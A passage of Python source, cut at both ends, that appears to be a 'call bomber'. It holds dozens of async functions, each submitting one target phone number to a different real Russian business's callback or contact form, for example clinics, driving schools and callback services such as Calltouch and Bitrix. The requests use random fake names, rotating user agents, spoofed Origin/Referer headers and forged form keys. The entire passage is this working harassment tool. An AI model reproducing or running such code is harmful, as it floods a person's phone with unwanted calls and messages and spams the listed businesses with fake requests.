    url = "https://avtoshkola4kolesa.ru/wp-json/contact-form-7/v1/contact-forms/464/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Запись в автошколу"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://avtoshkola4kolesa.ru","Referer":"https://avtoshkola4kolesa.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ad78_cf7(s, p):
    url = "https://ad-78.ru/wp-json/contact-form-7/v1/contact-forms/2946/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужна консультация"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://ad-78.ru","Referer":"https://ad-78.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_3voa(s, p):
    url = "https://3voa.ru/about-us/zapis/"
    d = {"name":rn(),"phone":p["digits_7"],"service":random.choice(AUTO_S)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://3voa.ru","Referer":"https://3voa.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_3voa(s, p):
    url = "https://mod.calltouch.ru/callback_call.php"
    d = {"workMode":"working_hours","sessionId":random.randint(100000000,999999999),"siteId":57454,"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://3voa.ru","Referer":"https://3voa.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_dar_med(s, p):
    url = "https://www.dar-med.ru/contacts/"
    d = {"name":rn(),"phone":p["formatted"],"specialist":random.choice(MED_S)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.dar-med.ru","Referer":"https://www.dar-med.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_venerolognn(s, p):
    url = "https://venerolognn.ru/obratnyy-zvonok/"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Нужна консультация венеролога"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://venerolognn.ru","Referer":"https://venerolognn.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_fmbafmbc_ajax(s, p):
    url = "https://fmbafmbc.ru/local/api/ajax.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://fmbafmbc.ru","Referer":"https://fmbafmbc.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_genom_eko(s, p):
    url = "https://tomsk.genom-eko.ru/api/v1/form/consult"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://tomsk.genom-eko.ru","Referer":"https://tomsk.genom-eko.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_thebears(s, p):
    url = "https://tomsk.thebears.ru/zvonok"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tomsk.thebears.ru","Referer":"https://tomsk.thebears.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stomatologiya_tomsk_3l(s, p):
    url = "https://stomatologiya-tomsk-3l.ru/zapisatsya-priem-stomatologiya/"
    d = {"name":rn(),"phone":p["digits_7"],"specialist":"Стоматолог","comment":"Запись на приём"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://stomatologiya-tomsk-3l.ru","Referer":"https://stomatologiya-tomsk-3l.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn80audlaff4h(s, p):
    url = "https://xn--80audlaff4h.xn--p1ai/feedback/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Консультация"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://xn--80audlaff4h.xn--p1ai","Referer":"https://xn--80audlaff4h.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_alterainvest_ajax(s, p):
    url = f"https://alterainvest.ru/local/ajax/actions.php?time={int(time.time()*1000)}"
    d = {"name":rn(),"phone":p["digits_7"],"action":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://alterainvest.ru","Referer":"https://alterainvest.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_garant_spb(s, p):
    url = "https://tomsk.garant-spb.ru/js/send/send.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":random.choice(SERV)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tomsk.garant-spb.ru","Referer":"https://tomsk.garant-spb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_powertomsk(s, p):
    url = "https://powertomsk.ru/bc/add.php"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://powertomsk.ru","Referer":"https://powertomsk.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_veb_avtoservice(s, p):
    url = "https://tomsk.veb-avtoservice.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on","service":random.choice(AUTO_S)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://tomsk.veb-avtoservice.ru","Referer":"https://tomsk.veb-avtoservice.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_afonyamaster(s, p):
    url = "https://afonyamaster.ru/thankyou.html"
    d = {"name":rn(),"phone":p["digits_7"],"service":random.choice(SERV)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://afonyamaster.ru","Referer":"https://afonyamaster.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stroygarantpskov(s, p):
    url = "https://stroygarantpskov.ru/catalog/services/order_item.php?AJAX=Y"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Строительные работы"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://stroygarantpskov.ru","Referer":"https://stroygarantpskov.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_santexnk_pskov(s, p):
    url = "https://santexnk.ru/pskov/zakaz-santex.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Сантехник"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://santexnk.ru","Referer":"https://santexnk.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pskov_kamprok(s, p):
    url = "https://pskov.kamprok.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pskov.kamprok.ru","Referer":"https://pskov.kamprok.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pskov_mastervdom(s, p):
    url = "https://pskov.mastervdom.ru/wp-content/themes/mastervdom/callback/send/send.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":random.choice(SERV)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pskov.mastervdom.ru","Referer":"https://pskov.mastervdom.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pskov_s5r(s, p):
    url = "https://pskov.s5r.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pskov.s5r.ru","Referer":"https://pskov.s5r.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pskov_agexperts(s, p):
    url = "https://pskov.agexperts.ru/callback/"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pskov.agexperts.ru","Referer":"https://pskov.agexperts.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_bitrix_koreanagroup(s, p):
    url = "https://bitrix.koreanagroup.ru/bitrix/services/main/ajax.php?action=crm.site.form.fill"
    d = {"fields":{"NAME":rn(),"PHONE":[{"VALUE":p["digits_7"]}]}}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://bitrix.koreanagroup.ru","Referer":"https://bitrix.koreanagroup.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_jivosite_callback(s, p):
    url = "https://telephony.jivosite.com/api/1/sites/742699/widgets/uSCGkUqVAb/clients/4343/telephony/callback"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://jivosite.com","Referer":"https://jivosite.com/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_enjoytouch_callback(s, p):
    url = "https://enjoytouch.ru/api/v1/callback"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://enjoytouch.ru","Referer":"https://enjoytouch.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_videocam_spb(s, p):
    url = "https://www.videocam.spb.ru/"
    d = {"name":rn(),"phone":p["formatted"],"message":"Установка видеонаблюдения"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.videocam.spb.ru","Referer":"https://www.videocam.spb.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_2109(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/2109/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка","requestUrl":"https://scady.ru/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://scady.ru","Referer":"https://scady.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_camerabazar(s, p):
    url = "https://camerabazar.ru/obratnyy-zvonok"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://camerabazar.ru","Referer":"https://camerabazar.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_frontcam_bitrix(s, p):
    url = "https://frontcam.bitrix24.ru/bitrix/services/main/ajax.php?action=crm.site.form.fill"
    d = {"fields":{"NAME":rn(),"PHONE":[{"VALUE":p["digits_7"]}]}}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://frontcam.bitrix24.ru","Referer":"https://frontcam.bitrix24.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_peterstyle_popup(s, p):
    url = "https://peterstyle.ru/include/popup-form.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://peterstyle.ru","Referer":"https://peterstyle.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_ruelle17(s, p):
    url = "https://ruelle17.com/form/call-form"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://ruelle17.com","Referer":"https://ruelle17.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_escaper(s, p):
    url = "https://tomsk.escaper.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://tomsk.escaper.ru","Referer":"https://tomsk.escaper.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_1001halat(s, p):
    url = "https://tomsk.1001halat.ru/wp-content/themes/1001halat/inc/forms/form-feedback.php"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tomsk.1001halat.ru","Referer":"https://tomsk.1001halat.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_maglena_tomsk(s, p):
    url = "https://maglena.tomsk.ru/about/rewiew/"
    d = {"name":rn(),"phone":p["digits_7"],"review":"Хочу оставить отзыв"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://maglena.tomsk.ru","Referer":"https://maglena.tomsk.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_apostrof_su(s, p):
    url = "https://apostrof.su/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://apostrof.su","Referer":"https://apostrof.su/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ecco_callback(s, p):
    url = f"https://www.ecco.ru/ajax/callback.php?name={rn()}&phone={p['plus_7']}&rulesAgree=on"
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://www.ecco.ru","Referer":"https://www.ecco.ru/"}
    async with s.get(url, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_kazan_indever(s, p):
    url = "https://kazan.indever.com/ajax/form.php"
    d = {"name":rn(),"phone":p["digits_7"],"action":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://kazan.indever.com","Referer":"https://kazan.indever.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_kazan_spetstek_cf7(s, p):
    url = "https://kazan.spetstek.ru/wp-json/contact-form-7/v1/contact-forms/846/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужна спецтехника"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://kazan.spetstek.ru","Referer":"https://kazan.spetstek.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_albione_callback(s, p):
    url = "https://albione.ru/ajax/new_callback.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://albione.ru","Referer":"https://albione.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_weissgauff_ajax(s, p):
    url = "https://www.weissgauff.ru/ajax/"
    d = {"name":rn(),"phone":p["digits_7"],"action":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://www.weissgauff.ru","Referer":"https://www.weissgauff.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_kristallkazan(s, p):
    url = "https://www.kristallkazan.ru/local/templates/main_catalog/parts/handler-forms.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.kristallkazan.ru","Referer":"https://www.kristallkazan.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_figurist_ajax(s, p):
    url = "https://www.figurist.ru/ajax/clikf.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://www.figurist.ru","Referer":"https://www.figurist.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_kazan_gruzovichkof(s, p):
    url = "https://kazan.gruzovichkof.ru/api/request"
    d = {"phone":p["digits_7"],"name":rn(),"comment":"Грузоперевозки"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://kazan.gruzovichkof.ru","Referer":"https://kazan.gruzovichkof.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_rfdatacenter_calls(s, p):
    url = "https://crm.rfdatacenter.ru/calls/megasimka.ru/v2"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://megasimka.ru","Referer":"https://megasimka.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_basan16_feedback(s, p):
    url = "https://www.basan16.ru/client_account/feedback.json"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Обратная связь"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://www.basan16.ru","Referer":"https://www.basan16.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_rkob_convertforms(s, p):
    url = "https://rkob.ru/rus/component/convertforms?task=submit"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://rkob.ru","Referer":"https://rkob.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ochkarik_callback(s, p):
    url = "https://ochkarik.ru/bitrix/services/main/ajax.php?mode=class&c=opticvision%3Aforms&action=callback"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://ochkarik.ru","Referer":"https://ochkarik.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_sochi_avtoshkola_cf7(s, p):
    url = "https://sochi-avtoshkola.ru/wp-json/contact-form-7/v1/contact-forms/549/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Запись в автошколу"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://sochi-avtoshkola.ru","Referer":"https://sochi-avtoshkola.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_avtoshkoli23_cf7(s, p):
    url = "https://avtoshkoli23.ru/wp-json/contact-form-7/v1/contact-forms/372/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Запись в автошколу"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://avtoshkoli23.ru","Referer":"https://avtoshkoli23.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_dpo_sochi(s, p):
    url = "https://dpo-sochi.ru/forms"
    d = {"name":rn(),"phone":p["digits_7"],"form_name":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://dpo-sochi.ru","Referer":"https://dpo-sochi.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_alan_avto_ajax(s, p):
    url = "https://alan-avto.com/wp-admin/admin-ajax.php?action=ajaxs_action&ajaxs_nonce=a7a60a9b77&jxs_act=ajaxs_wtw_mail_sent"
    d = {"name":rn(),"phone":p["raw"],"email":re_(),"message":"Запись на сервис"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://alan-avto.com","Referer":"https://alan-avto.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_dvigeniekzn_ajax(s, p):
    url = "https://dvigeniekzn.ru/wp-admin/admin-ajax.php?action=ajaxs_action&ajaxs_nonce=a25e717eae&jxs_act=ajaxs_wtw_mail_sent"
    d = {"name":rn(),"phone":p["raw"],"email":re_(),"message":"Заказ обратного звонка"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://dvigeniekzn.ru","Referer":"https://dvigeniekzn.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_albatroskazan(s, p):
    url = "https://albatroskazan.ru/local/templates/albatros/include/form_handler.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://albatroskazan.ru","Referer":"https://albatroskazan.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_kazan_ecolespb(s, p):
    url = "https://kazan.ecolespb.ru/leads/send"
    d = {"phone":p["digits_7"],"name":rn(),"form":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://kazan.ecolespb.ru","Referer":"https://kazan.ecolespb.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn80ajpfhbgomfh1b(s, p):
    url = "https://xn--80ajpfhbgomfh1b.xn--p1ai/kazan/profession/apparatchik-peregonki-i-rektif/"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://xn--80ajpfhbgomfh1b.xn--p1ai","Referer":"https://xn--80ajpfhbgomfh1b.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_comagic_v2_kazan(s, p):
    url = "https://server.comagic.ru/api/v2/"
    d = {"phone":p["digits_7"],"name":rn(),"callback_time":"now"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://xn--80ajpfhbgomfh1b.xn--p1ai","Referer":"https://xn--80ajpfhbgomfh1b.xn--p1ai/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_38994(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/38994/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка","requestUrl":"https://xn--80ajpfhbgomfh1b.xn--p1ai/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://xn--80ajpfhbgomfh1b.xn--p1ai","Referer":"https://xn--80ajpfhbgomfh1b.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_spb_pozitive_org(s, p):
    url = "https://spb.pozitive.org/forma_orig.php"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://spb.pozitive.org","Referer":"https://spb.pozitive.org/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mobimas(s, p):
    url = "http://mobimas.ru/zakazat-zvonok"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"http://mobimas.ru","Referer":"http://mobimas.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_spb_clean(s, p):
    url = "https://spb-clean.ru/templates/spb-clean/php/phpmailer/send.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Уборка"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://spb-clean.ru","Referer":"https://spb-clean.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_reddragon_spb(s, p):
    url = "https://reddragon-spb.ru/skcallback/"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://reddragon-spb.ru","Referer":"https://reddragon-spb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_sto_ducato(s, p):
    url = "https://www.sto-ducato.ru/kontakty/"
    d = {"name":rn(),"phone":p["digits_7"],"car":f"{random.choice(CAR_B)} {random.choice(CAR_M)}"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.sto-ducato.ru","Referer":"https://www.sto-ducato.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_komp_help_spb(s, p):
    url = "https://komp-help-spb.ru/modules/mod_simpleform2/index.php"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Нужна компьютерная помощь"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://komp-help-spb.ru","Referer":"https://komp-help-spb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_spb_clean(s, p):
    url = "https://mod.calltouch.ru/callback_call.php"
    d = {"workMode":"working_hours","sessionId":random.randint(100000000,999999999),"siteId":57454,"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://spb-clean.ru","Referer":"https://spb-clean.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_23869(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/23869/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка","requestUrl":"https://spb-clean.ru/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://spb-clean.ru","Referer":"https://spb-clean.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lilians_kazan(s, p):
    url = "https://lilians-kazan.ru/cart/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://lilians-kazan.ru","Referer":"https://lilians-kazan.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_spb_ilosos_asenizator(s, p):
    url = "https://spb.ilosos-asenizator.ru/mail.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Ассенизатор"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://spb.ilosos-asenizator.ru","Referer":"https://spb.ilosos-asenizator.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_otkachki(s, p):
    url = "https://tomsk.otkachki.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on","service":"Откачка"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://tomsk.otkachki.ru","Referer":"https://tomsk.otkachki.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_599997(s, p):
    url = "https://599997.ru/"
    d = {"name":rn(),"phone":p["formatted"],"message":"Нужна помощь"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://599997.ru","Referer":"https://599997.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_assenizator(s, p):
    url = "https://tomsk.assenizator.ru/mail.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Ассенизатор"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tomsk.assenizator.ru","Referer":"https://tomsk.assenizator.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_ilococ(s, p):
    url = "https://tomsk.ilococ.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://tomsk.ilococ.ru","Referer":"https://tomsk.ilococ.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_aquastrana(s, p):
    url = "https://tomsk.aquastrana.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tomsk.aquastrana.ru","Referer":"https://tomsk.aquastrana.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_volgograd_barssport(s, p):
    url = "https://volgograd.barssport-factory.ru/ajax/mod-mod_feedback/send-message"
